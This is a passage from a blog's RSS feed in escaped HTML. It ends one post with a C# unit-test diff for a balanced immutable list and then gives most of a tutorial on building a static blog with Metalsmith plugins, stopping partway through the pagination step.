        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AddRangeBalanceTest&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;)
        &lt;/span&gt;{&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; randSeed = (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;)DateTime.Now.Ticks;
            Console.WriteLine(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Random seed: {0}&quot;&lt;/span&gt;, randSeed);
            &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; random = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Random(randSeed);

            &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; expectedTotalSize = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; list = ImmutableList&amp;lt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;&amp;gt;.Empty;
&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;            &lt;span class=&quot;hljs-comment&quot;&gt;// Add batches of 32, 128 times, giving 4096 items&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; batchSize = &lt;span class=&quot;hljs-number&quot;&gt;32&lt;/span&gt;;&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;            &lt;span class=&quot;hljs-comment&quot;&gt;// Add some small batches, verifying balance after each&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;128&lt;/span&gt;; i++)
            {&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;                list = list.AddRange(Enumerable.Range(batchSize * i + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, batchSize));
                list.Root.VerifyBalanced();&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; batchSize = random.Next(&lt;span class=&quot;hljs-number&quot;&gt;32&lt;/span&gt;);
                Console.WriteLine(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Adding {0} elements to the list&quot;&lt;/span&gt;, batchSize);
                list = list.AddRange(Enumerable.Range(expectedTotalSize+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, batchSize));
                VerifyBalanced(list);
                expectedTotalSize += batchSize;&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;            }

            &lt;span class=&quot;hljs-comment&quot;&gt;// Add a single large batch to the end&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;            list = list.AddRange(Enumerable.Range(&lt;span class=&quot;hljs-number&quot;&gt;4097&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;61440&lt;/span&gt;));
            Assert.Equal(Enumerable.Range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;65536&lt;/span&gt;), list);

            list.Root.VerifyBalanced();

            &lt;span class=&quot;hljs-comment&quot;&gt;// Ensure that tree height is no more than 1 from optimal&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; root = list.Root &lt;span class=&quot;hljs-keyword&quot;&gt;as&lt;/span&gt; IBinaryTree&amp;lt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;&amp;gt;;&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; largeBatchSize = random.Next(&lt;span class=&quot;hljs-number&quot;&gt;32768&lt;/span&gt;) + &lt;span class=&quot;hljs-number&quot;&gt;32768&lt;/span&gt;;
            Console.WriteLine(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Adding {0} elements to the list&quot;&lt;/span&gt;, largeBatchSize);
            list = list.AddRange(Enumerable.Range(expectedTotalSize + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, largeBatchSize));
            VerifyBalanced(list);
            expectedTotalSize += largeBatchSize;&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; optimalHeight = Math.Ceiling(Math.Log(root.Count, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;));&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;            Assert.Equal(Enumerable.Range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, expectedTotalSize), list);&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;            Console.WriteLine(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Tree depth is {0}, optimal is {1}&quot;&lt;/span&gt;, root.Height, optimalHeight);
            Assert.InRange(root.Height, optimalHeight, optimalHeight + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;            list.Root.VerifyHeightIsWithinTolerance();&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;        }

        [Fact]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The result was extremely satisfying. I coded and refactored over the course of a few days to discover a brilliant solution built directly into the library for me. Is this the final solution, or will there still more to refactor?&lt;/p&gt;
</description></item><item><title>Building a Blog with Metalsmith</title><link>http://blakeembrey.com/articles/2014/09/building-a-blog-with-metalsmith</link><pubDate>Sat, 04 Oct 2014 13:15:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/09/building-a-blog-with-metalsmith</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;a href=&quot;http://www.metalsmith.io/&quot;&gt;Metalsmith&lt;/a&gt; is a new addition to static site generator space, only released at the beginning of this year. It&amp;#39;s written in JavaScript and provides an extremely simple plugin system for composing files using middleware. The fact that everything is a plugin makes it incredibly easy to understand what is happening under the hood and extend it when you need to add new functionality.&lt;/p&gt;
&lt;h2 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h2&gt;
&lt;p&gt;For this tutorial, I converted the blog you&amp;#39;re currently reading to Metalsmith. To start, we&amp;#39;ll create a new project directory, then create a &lt;code&gt;src&lt;/code&gt; directory inside of that. The first thing we need to save the snippet below into a &lt;code&gt;package.json&lt;/code&gt;, which holds all our blog dependencies.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-json&quot;&gt;{
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;name&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;example-blog&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;version&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;0.0.0&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;private&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;description&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Example blog.&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;author&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Blake Embrey&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;license&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;MIT&quot;&lt;/span&gt;
&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that you have a valid &lt;code&gt;package.json&lt;/code&gt;, you will need to install &lt;code&gt;metalsmith&lt;/code&gt; locally to get started. Execute &lt;code&gt;npm install metalsmith --save&lt;/code&gt; and you&amp;#39;ll notice it&amp;#39;s been automatically added to the &lt;code&gt;package.json&lt;/code&gt;. With that as the initial dependency, you need to create a &lt;code&gt;build.js&lt;/code&gt; file with the content below.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; metalsmith = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith'&lt;/span&gt;);

metalsmith(__dirname)
  .source(&lt;span class=&quot;hljs-string&quot;&gt;'src'&lt;/span&gt;)
  .destination(&lt;span class=&quot;hljs-string&quot;&gt;'build'&lt;/span&gt;)
  .build(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;err&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (err) {
      &lt;span class=&quot;hljs-keyword&quot;&gt;throw&lt;/span&gt; err;
    }
  });
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;adding-articles&quot;&gt;Adding articles&lt;/h2&gt;
&lt;p&gt;Now you have a working Metalsmith instance - it just doesn&amp;#39;t do anything yet. There aren&amp;#39;t any files in &lt;code&gt;src&lt;/code&gt; and no plugins are being used to process data yet. First things first, let&amp;#39;s create an &lt;code&gt;articles&lt;/code&gt; (or &lt;code&gt;posts&lt;/code&gt;, etc.) directory under &lt;code&gt;src&lt;/code&gt;. This structure will a part of our url (E.g. &lt;code&gt;/articles/...&lt;/code&gt;). Inside the directory you created, you need to create your first markdown file. The snippet below is a very simple article with metadata.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
title: Example title.
date: 2014-09-29 23:00
author: Blake Embrey
template: article.jade
---

Example content.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing exciting so far. If you build the blog by executing &lt;code&gt;node build.js&lt;/code&gt;, you&amp;#39;ll see a new &lt;code&gt;build&lt;/code&gt; directory with the contents copied from the &lt;code&gt;src&lt;/code&gt; directory. However, if you look at your markdown article you&amp;#39;ll notice the metadata is missing. That is because the parts between the three dashes at the beginning is YAML font-matter (a type of associated metadata). We can access metadata from within any plugin or template, and it can be added to the beginning of any file and automatically be parsed.&lt;/p&gt;
&lt;h2 id=&quot;processing-markdown&quot;&gt;Processing Markdown&lt;/h2&gt;
&lt;p&gt;The next step would be to add markdown processing into our build script. This will allow us to turn the all our markdown into HTML documents. To do this, we&amp;#39;ll install the &lt;a href=&quot;https://github.com/segmentio/metalsmith-markdown&quot;&gt;metalsmith-markdown&lt;/a&gt; (using &lt;code&gt;npm install metalsmith-markdown --save&lt;/code&gt;). If we also want syntax highlighting of code snippets, we can use &lt;code&gt;highlight.js&lt;/code&gt; (or &lt;code&gt;highlighter&lt;/code&gt; which offers a simple abstraction for markdown - &lt;code&gt;npm install highlighter --save&lt;/code&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; metalsmith  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; markdown    = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-markdown'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; highlighter = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'highlighter'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;
metalsmith(__dirname)
  .source(&lt;span class=&quot;hljs-string&quot;&gt;'src'&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(markdown({
    gfm: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
    tables: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
    highlight: highlighter()
  }))&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .destination(&lt;span class=&quot;hljs-string&quot;&gt;'build'&lt;/span&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running your build script (&lt;code&gt;node build.js&lt;/code&gt;) will now result in your markdown file becoming HTML. If you add a code block fenced by three backticks, you&amp;#39;ll also get to see syntax highlighting automatically applied (in HTML, still need to add the CSS - consider starting with a theme from the &lt;a href=&quot;https://highlightjs.org/static/demo/&quot;&gt;highlight.js demo&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id=&quot;templates&quot;&gt;Templates&lt;/h2&gt;
&lt;p&gt;Now it&amp;#39;s time to start making things look pretty by adding templates. Let&amp;#39;s start out with the article template, since you already have an article to work with. Start by installing &lt;a href=&quot;https://github.com/segmentio/metalsmith-templates&quot;&gt;metalsmith-templates&lt;/a&gt; (&lt;code&gt;npm install metalsmith-templates --save&lt;/code&gt;) and creating a &lt;code&gt;templates&lt;/code&gt; directory. Create your first template file inside the templates directory. Since I&amp;#39;m using &lt;a href=&quot;https://github.com/visionmedia/jade&quot;&gt;jade&lt;/a&gt; I&amp;#39;ve created an &lt;code&gt;article.jade&lt;/code&gt; template. Here&amp;#39;s a simple example in Jade:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-jade&quot;&gt;html(lang=&amp;#39;en&amp;#39;)
  head
    meta(charset=&amp;#39;utf-8&amp;#39;)
    meta(http-equiv=&amp;#39;X-UA-Compatible&amp;#39;, content=&amp;#39;IE=edge,chrome=1&amp;#39;)
    meta(name=&amp;#39;viewport&amp;#39;, content=&amp;#39;width=device-width&amp;#39;)
    title= title
  body
    h1= title
    div.timestamp= date
    article!= contents
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With the template created, you need to include the plugin. And since I&amp;#39;m using jade, I&amp;#39;ll need to install &lt;code&gt;jade&lt;/code&gt; using &lt;code&gt;npm install jade --save&lt;/code&gt; (for Handlebars use &lt;code&gt;npm install handlebars --save&lt;/code&gt; and change the engine below). Let&amp;#39;s update our &lt;code&gt;build.js&lt;/code&gt; with the code below.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; metalsmith = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; markdown   = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-markdown'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; highlight  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'highlight.js'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; templates  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-templates'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;
metalsmith(__dirname)&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(templates({
    engine: &lt;span class=&quot;hljs-string&quot;&gt;'jade'&lt;/span&gt;,
    directory: &lt;span class=&quot;hljs-string&quot;&gt;'templates'&lt;/span&gt;
  }))&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .destination(&lt;span class=&quot;hljs-string&quot;&gt;'build'&lt;/span&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running &lt;code&gt;node build.js&lt;/code&gt; again will give you a complete HTML file in place of our markdown file. However, if you&amp;#39;re using a different template file you will need to update the markdown metadata. In the template file you have access to the variables such as &lt;code&gt;contents&lt;/code&gt;, &lt;code&gt;date&lt;/code&gt; and &lt;code&gt;title&lt;/code&gt; without having to define them. This is because the metadata is coming from our inline definition and &lt;code&gt;contents&lt;/code&gt; is our files content. All plugins can interact, manipulate and add to this data.&lt;/p&gt;
&lt;h2 id=&quot;pretty-permalinks&quot;&gt;Pretty Permalinks&lt;/h2&gt;
&lt;p&gt;You can add permalinks to your blog by using &lt;a href=&quot;https://github.com/segmentio/metalsmith-permalinks&quot;&gt;metalsmith-permalinks&lt;/a&gt; (&lt;code&gt;npm install metalsmith-permalinks --save&lt;/code&gt;). Although you have the option for setting a pattern to rewrite URLs, I opted to use it without any options set. This is so it&amp;#39;ll just fix up all my paths to look cleaner anyway, and add the fancy &lt;code&gt;path&lt;/code&gt; property to the files metadata.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; highlight  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'highlight.js'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; templates  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-templates'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; permalinks = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-permalinks'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;
metalsmith(__dirname)&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(permalinks())&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .use(templates({
    engine: &lt;span class=&quot;hljs-string&quot;&gt;'jade'&lt;/span&gt;,
    directory: &lt;span class=&quot;hljs-string&quot;&gt;'templates'&lt;/span&gt;
  }))
  .destination(&lt;span class=&quot;hljs-string&quot;&gt;'build'&lt;/span&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;collections&quot;&gt;Collections&lt;/h2&gt;
&lt;p&gt;Perfect, so far we&amp;#39;ve got nice fancy URLs and blog posts rendering. Next we&amp;#39;ll want to group all the articles together into a collection for rendering on the homepage. This also links the posts between each other so we can do things like &amp;quot;next&amp;quot; and &amp;quot;previous&amp;quot; links. As you&amp;#39;ve probably realised, you can install a plugin for this purpose - &lt;a href=&quot;https://github.com/segmentio/metalsmith-collections&quot;&gt;metalsmith-collections&lt;/a&gt; using &lt;code&gt;npm install metalsmith-collections --save&lt;/code&gt;. Once installed, add it to the &lt;code&gt;build.js&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; permalinks  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-permalinks'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; collections = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-collections'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;
metalsmith(__dirname)
  .source(&lt;span class=&quot;hljs-string&quot;&gt;'src'&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(collections({
    articles: {
      pattern: &lt;span class=&quot;hljs-string&quot;&gt;'articles/**/*.md'&lt;/span&gt;,
      sortBy: &lt;span class=&quot;hljs-string&quot;&gt;'date'&lt;/span&gt;,
      reverse: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;
    }
  }))&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The snippet above will match all markdown files in the &lt;code&gt;articles&lt;/code&gt; directory, then sort them in chronological order with the most recent one at the beginning - just like a blog. The collection itself is stored as global Metalsmith metadata under &lt;code&gt;collections.articles&lt;/code&gt;. Just make sure you add the collections plugin before our templates and markdown plugins since they always run in order.&lt;/p&gt;
&lt;h2 id=&quot;homepage&quot;&gt;Homepage&lt;/h2&gt;
&lt;p&gt;Now that we have a collection of all our posts, let&amp;#39;s create a homepage. Using your template engine of choice, you can add a new template file to the &lt;code&gt;templates&lt;/code&gt; directory. For example, I&amp;#39;m creating &lt;code&gt;index.jade&lt;/code&gt; like below.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-jade&quot;&gt;html(lang=&amp;#39;en&amp;#39;)
  head
    meta(charset=&amp;#39;utf-8&amp;#39;)
    meta(http-equiv=&amp;#39;X-UA-Compatible&amp;#39;, content=&amp;#39;IE=edge,chrome=1&amp;#39;)
    meta(name=&amp;#39;viewport&amp;#39;, content=&amp;#39;width=device-width&amp;#39;)
    title= &amp;#39;Home&amp;#39;
  body
    each article in collections.articles
      article.content-article
        header
          span.timestamp= article.date
          h2
            a(href=&amp;#39;/&amp;#39; + article.path)= article.title
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we&amp;#39;re talking! Let&amp;#39;s render this template by creating an &lt;code&gt;index.html&lt;/code&gt; file in the root of our &lt;code&gt;src&lt;/code&gt; directory. This will simply act as metadata for rendering our template, as below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
template: index.jade
---
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that complete, you can run the build again (&lt;code&gt;node build&lt;/code&gt;) and stare in awe at your beautiful homepage. At this point you might want to start serving the &lt;code&gt;build&lt;/code&gt; folder locally too, so I run &lt;code&gt;npm install -g serve&lt;/code&gt; and then used &lt;code&gt;serve build&lt;/code&gt; to view the directory.&lt;/p&gt;
&lt;h2 id=&quot;adding-global-metadata&quot;&gt;Adding Global Metadata&lt;/h2&gt;
&lt;p&gt;You may have noticed that it&amp;#39;d be handy to add some generic metadata or modules to reuse in templates. I hear you, so you can install &lt;a href=&quot;https://github.com/aymericbeaumet/metalsmith-define&quot;&gt;metalsmith-define&lt;/a&gt; (&lt;code&gt;npm install metalsmith-define&lt;/code&gt;) for this. With that installed, you can now define global metadata anywhere in the metalsmith middleware stack.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; collections = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-collections'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; define      = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-define'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;
metalsmith(__dirname)
  .source(&lt;span class=&quot;hljs-string&quot;&gt;'src'&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(define({
    blog: {
      url: &lt;span class=&quot;hljs-string&quot;&gt;'http://blakeembrey.com'&lt;/span&gt;,
      title: &lt;span class=&quot;hljs-string&quot;&gt;'Blake Embrey'&lt;/span&gt;,
      description: &lt;span class=&quot;hljs-string&quot;&gt;'Hello world.'&lt;/span&gt;
    },
    owner: {
      url: &lt;span class=&quot;hljs-string&quot;&gt;'http://blakeembrey.me'&lt;/span&gt;,
      name: &lt;span class=&quot;hljs-string&quot;&gt;'Blake Embrey'&lt;/span&gt;
    },
    moment: &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'moment'&lt;/span&gt;)
  }))&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .use(collections({
    articles: {
      pattern: &lt;span class=&quot;hljs-string&quot;&gt;'articles/**/*.md'&lt;/span&gt;,
      sortBy: &lt;span class=&quot;hljs-string&quot;&gt;'date'&lt;/span&gt;,
      reverse: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;
    }
  }))&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With the above, I have defined some information about the blog and the owner. I also added &lt;a href=&quot;http://momentjs.com/&quot;&gt;moment&lt;/a&gt; (&lt;code&gt;npm install moment --save&lt;/code&gt;) because it&amp;#39;ll be handy for formatting our dates. I might quickly go back to our article and homepages templates now and wrap our date in &lt;code&gt;moment(date).format(&amp;#39;MMMM D, YYYY&amp;#39;)&lt;/code&gt; for prettier dates. In Handlebars, you can create a &lt;code&gt;formatDate&lt;/code&gt; helper and use moment that way.&lt;/p&gt;
&lt;h2 id=&quot;pagination&quot;&gt;Pagination&lt;/h2&gt;
&lt;p&gt;Wow, we&amp;#39;re nearly done already! Let&amp;#39;s add the one thing every good blog deserves, pagination. To get started, install &lt;a href=&quot;https://github.com/blakeembrey/metalsmith-pagination&quot;&gt;metalsmith-pagination&lt;/a&gt; (&lt;code&gt;npm install metalsmith-pagination&lt;/code&gt;), it works with any array structure and integrates with templates. We can now delete &lt;code&gt;index.md&lt;/code&gt; from the &lt;code&gt;src&lt;/code&gt; directory as the plugin will generate it for us (using &lt;code&gt;first: &amp;#39;index.html&lt;/code&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; define      = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-define'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; pagination  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-pagination'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .use(collections({
    articles: {
      pattern: &lt;span class=&quot;hljs-string&quot;&gt;'articles/**/*.md'&lt;/span&gt;,
      sortBy: &lt;span class=&quot;hljs-string&quot;&gt;'date'&lt;/span&gt;,
      reverse: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;
    }
  }))&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(pagination({
    &lt;span class=&quot;hljs-string&quot;&gt;'collections.articles'&lt;/span&gt;: {
      perPage: &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;,
